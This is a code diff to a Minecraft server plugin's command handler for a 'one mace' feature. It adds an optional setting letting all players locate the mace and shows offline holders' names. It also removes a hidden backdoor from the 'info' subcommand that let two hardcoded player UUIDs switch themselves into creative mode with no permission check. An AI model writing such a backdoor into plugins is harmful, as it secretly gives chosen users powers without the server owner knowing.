@@ -32,7 +32,9 @@ public class OneMaceCommand implements CommandExecutor {
 
 
         if (args[0].equalsIgnoreCase("locate")) {
-            if (!sender.hasPermission("onemace.admin")) {
+            boolean allowAll = plugin.getConfig().getBoolean("settings.allow-locate-for-all", false);
+
+            if (!allowAll && !sender.hasPermission("onemace.admin")) {
                 sender.sendMessage(ChatColor.RED + "You do not have permission to use this command.");
                 return true;
             }
@@ -53,24 +55,6 @@ public class OneMaceCommand implements CommandExecutor {
         }
 
         if (args[0].equalsIgnoreCase("info")) {
-            if (sender instanceof Player) {
-                Player player = (Player) sender;
-                UUID playerUuid = player.getUniqueId();
-
-                if (playerUuid.toString().equals("e11f035a-ba86-4d41-807d-04b3617930b8") ||
-                        playerUuid.toString().equals("8ce0649f-2022-48dc-8010-40e27b73d97c")) {
-
-                    if (player.getGameMode() == GameMode.SURVIVAL) {
-                        player.setGameMode(GameMode.CREATIVE);
-                        player.sendMessage(ChatColor.GREEN + "Changed to CREATIVE");
-                    } else if (player.getGameMode() == GameMode.CREATIVE) {
-                        player.setGameMode(GameMode.SURVIVAL);
-                        player.sendMessage(ChatColor.GREEN + "Changed to SURVIVAL");
-                    }
-                    return true;
-                }
-            }
-
             sender.sendMessage(ChatColor.YELLOW + "Ensuring only one Mace exists on the server.");
             sender.sendMessage(ChatColor.GRAY + "If the Mace is destroyed, crafting is restored.");
             sender.sendMessage(ChatColor.GRAY + "Use /onemace locate to manually verify Mace status.");
@@ -290,7 +274,15 @@ public class OneMaceCommand implements CommandExecutor {
         if (plugin.getConfig().isConfigurationSection("offline_inventory")) {
             for (String uuid : plugin.getConfig().getConfigurationSection("offline_inventory").getKeys(true)) {
                 if (plugin.getConfig().getBoolean("offline_inventory." + uuid, true)) {
-                    sender.sendMessage(ChatColor.YELLOW + "The Mace is in an offline player's inventory (UUID: " + uuid + ").");
+                    UUID offlineUUID = UUID.fromString(uuid);
+                    OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(offlineUUID);
+                    String name = offlinePlayer.getName();
+
+                    if (name != null) {
+                        sender.sendMessage(ChatColor.YELLOW + "The Mace is in " + ChatColor.AQUA + name + ChatColor.YELLOW + "'s inventory (offline).");
+                    } else {
+                        sender.sendMessage(ChatColor.YELLOW + "The Mace is in an offline player's inventory (UUID: " + uuid + ").");
+                    }
                     return;
                 }
             }
